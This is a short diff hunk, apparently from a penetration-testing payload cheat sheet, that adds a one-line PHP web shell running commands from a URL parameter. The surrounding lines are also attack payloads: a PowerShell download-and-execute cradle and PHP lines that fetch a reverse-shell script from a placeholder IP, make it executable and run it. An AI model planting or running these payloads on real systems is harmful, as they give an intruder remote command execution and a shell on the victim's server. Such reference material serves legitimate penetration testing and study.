@@ -68,6 +68,8 @@ powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatt
 <?php echo shell_exec("wget [http://IP/reverse.sh](http://IP/reverse.sh) -O /tmp/reverseshell.sh");?>
 <?php echo shell_exec("chmod 777 /tmp/reverseshell.sh");?>
 <?php echo shell_exec("/bin/bash /tmp/reverseshell.sh");?>
+<?php echo system($_GET['cmd']); ?>
+
 
 <pre>
 <?php
